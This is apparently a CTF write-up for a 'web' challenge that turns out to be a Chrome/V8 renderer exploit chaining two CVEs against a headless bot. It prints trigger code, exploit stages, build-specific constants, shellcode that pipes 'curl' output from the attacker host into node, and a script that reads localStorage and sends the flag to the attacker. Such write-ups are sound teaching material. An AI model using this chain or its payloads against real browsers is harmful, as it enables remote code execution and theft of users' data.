# Ibrahim's Tea

**Category:** Web | **Difficulty:** Elite | **Points:** 500 | **Flag:** `pwnsec{e26b04d08c6f466a}`

> Solve count: 1. This is a "web" challenge in name only — it's a full Chrome/V8 renderer exploit chaining two real CVEs.

## Challenge Description

> What did you say was wrong with Ibrahim's tea?
>
> **- @Macabely**

## Initial Analysis

Two tiny services (`challenge/web-server.js`, `challenge/bot-server.js`):

**The web app** reflects the `content` query parameter straight into the page. HTML injection works, but it ships `Content-Security-Policy: script-src 'none'`, and — more importantly — the flag isn't anywhere in this page's DOM. So classic reflected XSS gets you nothing.

**The bot** is where the real target is. It stores the flag in `localStorage` of the internal app origin, then opens an attacker-supplied URL and waits 10 seconds:

```js
await page.goto(APP_ORIGIN);                                   // http://web:3000
await page.evaluate(flag => localStorage.setItem("flag", flag), FLAG);
await page.close();
page = await browser.newPage();
await page.goto(url, { waitUntil: "domcontentloaded", timeout: 5000 }).catch(() => {});
await sleep(10000);
```

Three observations decide the whole challenge:

1. The attacker page and `http://web:3000` are **different origins**, so the Same-Origin Policy stops us reading that `localStorage` directly.
2. The bot runs Chrome `152.0.7977.75` — one build *older* than `152.0.7977.82`, the release that fixed **CVE-2026-85046** (a V8 type confusion).
3. Chrome launches with `--no-sandbox`. So if we get native code execution in the renderer, that's game over — no separate OS sandbox escape needed.

The intended path isn't XSS at all: exploit the pinned-vulnerable V8 build, get native RCE in the browser process, and read the flag the bot already loaded.

## The Vulnerability

The chain stacks two V8 bugs:

```
CVE-2026-85046 (V8 sort() type confusion)
      ↓  arbitrary R/W inside the V8 pointer-compression cage
CVE-2026-87491 (stale Wasm implicit instance)
      ↓  native memory access outside the V8 sandbox  →  native code execution
Read the flag the bot stored  →  exfiltrate to the attacker
```

### Stage 1 — cage R/W via CVE-2026-85046 (`exploit/stage1.js`)

The trigger re-enters `Array.prototype.sort()`'s comparator and mutates the array mid-sort:

```js
function confuse(a) {
  function cmp() { a.fill(0); return 0; }
  a.sort(cmp);
}
```

`sort()` caches assumptions about the array's elements-kind, but `fill(0)` inside the comparator changes the storage/representation. The vulnerable build mishandles that re-entry, so object and numeric elements get read as the wrong type. From there:

- `addrof(o)` — confuse `[o, o]`, read element 0 as a number to leak a compressed tagged pointer.
- Promote the target into old space, reclaim a dangling slot, and spray fake `JSArray` headers (using build-specific constants `DOUBLE_MAP = 0x0103282d`, `OBJECT_MAP = 0x010328b5`, …).
- The result is a `master`/`victim` pair giving reliable `addrof` + arbitrary **read/write inside the pointer-compression cage**, finally wrapped as `read32`/`write32` and left in `cage_rw` for stage 2.

This R/W is still confined to the cage — it can't touch libc or arbitrary native memory yet. Hence stage 2.

### Stage 2 — sandbox escape via CVE-2026-87491 (`exploit/poc.js`)

CVE-2026-87491 lets a JavaScript accessor run *while* WebAssembly exception metadata is being processed. The accessor swaps a table entry, so the replacement Wasm function executes with the **original driver's stale `WasmTrustedInstanceData`** — the wrong implicit instance. The exploit:

1. Copies the genuine private `wasm_exception_tag_symbol` into a forged object carrying a getter (using the stage-1 cage R/W to clone the private key).
2. Corrupts an `exnref` table entry to point at the forged object (located dynamically by diffing two near-identical Wasm table twins — no hardcoded heap offsets).
3. Warms the `driver` path, then fires it so the getter replaces `table[0]` with a function from a *different* instance `d`. That function's memory64 load/store now operates on `a`'s stale trusted/native context.

Wrapped up, this yields `arwRead`/`arwWrite` into trusted/native memory. `discoverCodeAlias()` then walks the JITed Wasm code, confirms an aliased executable region (self-tests with a `getpid` syscall stub), and overwrites it with syscall shellcode.

### The shellcode (`exploit/payload.asm`)

A small `fork` + `execve` stub runs a shell command in the renderer process:

```asm
mov eax,57      ; fork
syscall
test eax,eax
jnz parent
...             ; execve("/bin/sh", ["/bin/sh","-c",command], 0)
command: db '/usr/bin/curl -fsS http://172.19.0.1:9111/steal.js|/usr/local/bin/node',0
```

That reaches back to our attacker server (`172.19.0.1` is the Docker bridge gateway in the local setup) and pipes `steal.js` into `node`.

### Grabbing the flag (`exploit/steal.js`)

Native RCE means we're no longer boxed in by the Same-Origin Policy. `steal.js` finds the live Chrome DevTools port from the profile dir, connects with Puppeteer, opens the internal app origin, and reads the `localStorage` the bot populated:

```js
await page.goto(origin, { waitUntil:'domcontentloaded', timeout:1500 });   // http://web:3000
flag = await page.evaluate(() => localStorage.getItem('flag')) || '';
await fetch('http://172.19.0.1:9111/leak?f=' + encodeURIComponent(flag));
```

> The accompanying writeup documents an equivalent variant that instead leaks the flag through the `$FLAG` environment variable the Chrome child inherits (`wget <attacker>/$FLAG`). Both reach the same place via the same two-CVE chain; the scripts here use the DevTools + `localStorage` route.

## Exploitation

All exploit files are in [`exploit/`](exploit/):

| File | Role |
|---|---|
| `serve_exploit.js` | Attacker HTTP server — serves the chain and catches the flag on `/leak`. |
| `run.html` | Entry page; loads `stage1.js` then `poc.js`. |
| `stage1.js` | CVE-2026-85046 → cage arbitrary R/W. |
| `poc.js` | CVE-2026-87491 → sandbox escape → shellcode overwrite → RCE. |
| `payload.asm` | `fork`+`execve` syscall stub (assembled into the bytes embedded in `poc.js`). |
| `steal.js` | Post-RCE: DevTools → read `localStorage.flag` → exfil. |
| `build.py` | Builds the payload for a chosen public origin (templates: `poc.template.js`, `steal.template.js`). |

Steps:

1. **Build** the payload for your attacker origin:

   ```bash
   python3 exploit/build.py http://ATTACKER_ORIGIN
   # assembles payload.asm with nasm, injects the shellcode bytes into poc.js,
   # and fills steal.js with your origin
   ```

2. **Serve** the chain (and listen for the leak):

   ```bash
   node exploit/serve_exploit.js       # listens on 127.0.0.1:9111 by default
   ```

3. **Submit** the exploit URL to the bot (expose your server publicly first, e.g. via a tunnel):

   ```bash
   curl -X POST --data-urlencode 'url=https://ATTACKER/run.html' https://bot-CHALLENGE_HOST/visit
   ```

The bot loads `run.html`, stage 1 builds cage R/W, stage 2 escapes and plants shellcode, the renderer shells out to `curl … | node`, and `steal.js` posts the flag to `/leak`.

### Reliability notes

This is probabilistic. Stage-1 slot reclaim is GC-sensitive (the writeup settled on 8 rounds × 40000 allocations, retried up to 8 times), movable V8 object addresses must be re-leaked before each wide R/W, and the native scan can occasionally touch an unmapped page and crash the renderer. The move that most improved reliability was keeping the pre-trigger allocation footprint small and loading the heavy command-exec logic *after* the primitive was built. Keeping the payload bytes fixed and simply re-submitting the same URL was the practical approach.

## Flag

```
pwnsec{e26b04d08c6f466a}
```

## Key Takeaways

- **"Web" can mean renderer pwn.** A pinned, one-build-stale Chrome plus `--no-sandbox` turns a browser-bot web challenge into a V8 exploitation problem — check the exact browser version.
- **Chaining two bugs:** CVE-2026-85046 only buys read/write *inside* the pointer-compression cage; you need a second bug (CVE-2026-87491's stale Wasm instance) to reach native memory and actually escape the V8 sandbox.
- **`--no-sandbox` removes the last line of defense** — native code execution in the renderer is immediately process-level RCE, so SOP stops mattering (DevTools or `$FLAG` both work).
- **Discover offsets dynamically.** The exploit diffs twin Wasm objects and scans for metadata rather than hardcoding heap layout, which survives per-process ASLR and GC movement far better.
